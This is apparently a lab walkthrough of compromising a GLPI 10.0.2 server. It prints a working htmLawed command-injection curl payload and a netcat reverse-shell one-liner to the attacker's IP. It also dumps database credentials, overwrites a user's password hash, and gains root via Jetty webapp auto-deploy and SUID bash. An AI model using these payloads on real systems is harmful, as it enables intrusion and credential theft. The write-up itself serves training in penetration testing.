`Running all scans on 192.168.190.242`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

`---------------------Starting Script Scan-----------------------`

`PORT   STATE SERVICE VERSION`
`22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)`
`|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)`
`|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)`
`80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))`
`|_http-title: Authentication - GLPI`
`|_http-server-header: Apache/2.4.41 (Ubuntu)`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

![[Pasted image 20240212144321.png]]

I remember another machine I've done had GLPI running and there are some default credentials we can try along with the usual weak ones.

Google: glpi default credentials
https://forum.glpi-project.org/viewtopic.php?id=23219

`glpi/glpi (super-admin)`  
`tech/tech`  
`postonly/postonly (only for helpdesk)`  
`normal/normal`

None of these or the usual weak credentials work.

If we google GLPI exploitdb, there are a bunch of version dependent exploits. Let's see if we can narrow down the version.

Looking at the source code for GLPI
https://github.com/glpi-project/glpi

It comes with a CHANGELOG.md. Check if ours has that.
http://192.168.190.242/CHANGELOG.md

We can see the version is 10.0.2.

Google glpi 10.0.2 exploitdb and go to the first result.
https://www.exploit-db.com/exploits/51233
We try this exploit but see it's not working - at the top of the exploit it even says it depends on configuration.

The second result on google is a command injection exploit.
https://packetstormsecurity.com/files/169501/GLPI-10.0.2-Command-Injection.html

Let's glance through the code, see what it does.
It needs this resource -  `/vendor/htmlawed/htmlawed/htmLawedTest.php`

On our target, that is at the root of the domain so we don't need the target_URI option in metasploit.

`msf6 exploit(linux/http/glpi_htmlawed_php_injection) > set LHOST 192.168.45.235`
`LHOST => 192.168.45.235`
`msf6 exploit(linux/http/glpi_htmlawed_php_injection) > set RHOSTS 192.168.190.242`
`RHOSTS => 192.168.190.242`
`msf6 exploit(linux/http/glpi_htmlawed_php_injection) > set TARGET_URI ''`

`msf6 exploit(linux/http/glpi_htmlawed_php_injection) > run`

`[*] Started reverse TCP handler on 192.168.45.235:4444` 
`[*] Running automatic check ("set AutoCheck false" to disable)`
`[+] The target appears to be vulnerable.`
`[*] Executing Nix Command for cmd/unix/python/meterpreter/reverse_tcp`
`[*] Exploit completed, but no session was created.`

It tells us the machine is vulnerable so let's keep looking at this exploit.

We find this guide on how the exploit works:
https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/

There is this warning which explains why it's not working
![[Pasted image 20240212153155.png]]

This can be double checked looking at phpinfo - http://192.168.190.242/phpinfo.php
![[Pasted image 20240212153327.png]]

As suggested, I was able to get this working using call_user_func and array_map.
`└─$ curl -s -d 'sid=foo&text=call_user_func&hhook=array_map&hexec=passthru&spec[0]=&spec[1]=id' -b 'sid=foo' -X POST http://192.168.190.242/vendor/htmlawed/htmlawed/htmLawedTest.php`

This worked but was a little messy. To clean it up, I eliminated the before and after of the output we really want.
`└─$ curl -s -d 'sid=foo&text=call_user_func&hhook=array_map&hexec=passthru&spec[0]=&spec[1]=id' -b 'sid=foo' -X POST http://192.168.190.242/vendor/htmlawed/htmlawed/htmLawedTest.php | grep -oPz '(?s)(?<=<\/form>).*?(?=<br \/><a href="htmLawedTest.php")'`

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Let's get a reverse shell.
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.235 80 >/tmp/f`
It doesn't like this so let's URL encode it since we're sending a bunch of special characters.
`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.222%2080%20%3E%2Ftmp%2Ff`

This works. Catch and upgrade.
`Connection from 192.168.190.242:33470.`
`bash: cannot set terminal process group (1077): Inappropriate ioctl for device`
`bash: no job control in this shell`
`www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`<ed$ python3 -c 'import pty; pty.spawn("/bin/bash")'`  
`www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed$` 

From our Feroxbuster scan, there was this file
`500      GET        0l        0w        0c http://192.168.190.242/config/config_db.php`

But we couldn't read it earlier so let's try now that we have a foothold.
`www-data@glpi:/var/www/glpi/config$ cat config_db.php`
`cat config_db.php`
`<?php`
`class DB extends DBmysql {`
   `public $dbhost = 'localhost';`
   `public $dbuser = 'glpi';`
   `public $dbpassword = 'glpi_db_password';`
   `public $dbdefault = 'glpi';`
   `public $use_utf8mb4 = true;`
   `public $allow_myisam = false;`
   `public $allow_datetime = false;`
   `public $allow_signed_keys = false;`
`}`

Connect to the database
`www-data@glpi:/var/www/glpi/config$ mysql -u glpi -p`
`mysql -u glpi -p`
`Enter password: glpi_db_password`

`mysql> show databases;`
`show databases;`
`+--------------------+`
`| Database           |`
`+--------------------+`
`| glpi               |`
`| information_schema |`
`| performance_schema |`
`+--------------------+`
`3 rows in set (0.01 sec)`

`mysql> use glpi;`

`mysql> show tables;`

`mysql> select id,name,password,realname from glpi_users;`
`select id,name,password,realname from glpi_users;`
`+----+-------------+--------------------------------------------------------------+------------+`
`| id | name        | password                                                     | realname   |`
`+----+-------------+--------------------------------------------------------------+------------+`
`|  2 | glpi        | $2y$10$9DbdMovtCw0eI.FWm18SRu34ErQD6LUzA8AqGUqiEat0S/ahlyHFa | Montgomery |`
`|  3 | post-only   | $2y$10$dTMar1F3ef5X/H1IjX9gYOjQWBR1K4bERGf4/oTPxFtJE/c3vXILm | NULL       |`
`|  4 | tech        | $2y$10$.xEgErizkp6Az0z.DHyoeOoenuh0RcsX4JapBk2JMD6VI17KtB1lO | NULL       |`
`|  5 | normal      | $2y$10$Z6doq4zVHkSPZFbPeXTCluN1Q/r0ryZ3ZsSJncJqkN3.8cRiN0NV. | NULL       |`
`|  6 | glpi-system |                                                              | Support    |`
`|  7 | betty       | $2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa | berta      |`
`+----+-------------+--------------------------------------------------------------+------------+`
`6 rows in set (0.00 sec)`

`www-data@glpi:/var/www/glpi/config$ cat /etc/passwd`
`betty:x:1000:1000::/home/betty:/bin/sh`

It looks like betty is our pivot user but we can't crack her password.

Let's try to change it
Generate a hash for the new password: 
https://bcrypt.online/ (use 10 for the cost factor, we can see that from the current password hash)

`update glpi_users set password = '$2y$10$QFK8S6JHbOIiqFOAUPm2CuVmH.DA5QGzW/Tfk2zXvlPbMqGYBakHK' where name = 'betty';`

After we do that, we can login to the glpi web interface
![[Pasted image 20240212165308.png]]

There is 1 solved ticket - look at it.

![[Pasted image 20240212165334.png]]

Let's try to SSH with this. It works.
`└─$ ssh betty@192.168.190.242` 
`betty@glpi:~$` 

Running linpeas we can see there is another port listening - 8080 that we can't get to.

`betty@glpi:/tmp$ netstat -ntpl`
`(Not all processes could be identified, non-owned process info`
 `will not be shown, you would have to be root to see it all.)`
`Active Internet connections (only servers)`
`Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name`    
`tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -`                   
`tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -`                   
`tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -`                   
`tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -`                   
`tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -`                   
`tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -`                   

We can see in the ticket where we got betty's password this is probably the Jetty development server.

It can be exploited for privilege escalation as found here
https://book.hacktricks.xyz/pentesting-web/file-upload

Basically any XML you create in the webapps folder executes immediately
`echo "chmod +s /bin/bash" > /tmp/root.sh`
`chmod +x /tmp/root.sh`
`cd /opt/jetty/jetty-base/webapps`
![[Pasted image 20240212173734.png]]
`betty@glpi:/opt/jetty/jetty-base/webapps$ bash -p`
`bash-5.0# whoami`
`root`
`bash-5.0# cat /root/proof.txt`
`8e79fb674be65cd01d8257aa54201230`






